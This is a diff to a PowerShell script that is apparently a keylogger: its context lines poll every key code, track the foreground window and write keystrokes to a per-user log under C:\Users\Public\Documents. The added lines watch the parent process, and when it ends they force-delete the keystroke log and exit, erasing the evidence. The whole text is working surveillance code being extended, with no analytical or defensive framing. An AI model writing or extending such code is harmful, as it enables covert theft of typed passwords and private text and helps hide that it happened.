@@ -33,6 +33,9 @@ public static extern int GetForegroundWindow();
     $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
     $getWindow = Add-Type -MemberDefinition $getwin_sig -name "Win32MyGetForegroundWindow" -namespace Win32Functions -passThru
 
+    $processId = $PID
+    $parentProcessId = (Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $processId").ParentProcessId
+    
     $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
     $oldWindow = 0
 
@@ -41,6 +44,16 @@ public static extern int GetForegroundWindow();
     while ($true) 
     {
         Start-Sleep -Milliseconds 20
+
+        # Check if parent process is running
+        if (-not (Get-Process -Id $parentProcessId -ErrorAction SilentlyContinue)) {
+            $logPath = "c:\Users\Public\Documents\$($env:USERNAME)log.txt"
+            if (Test-Path $logPath) {
+                Remove-Item $logPath -Force
+            }
+            exit
+        }
+        
         $gotit = ""
         for ($char = 1; $char -le 254; $char++) 
         {
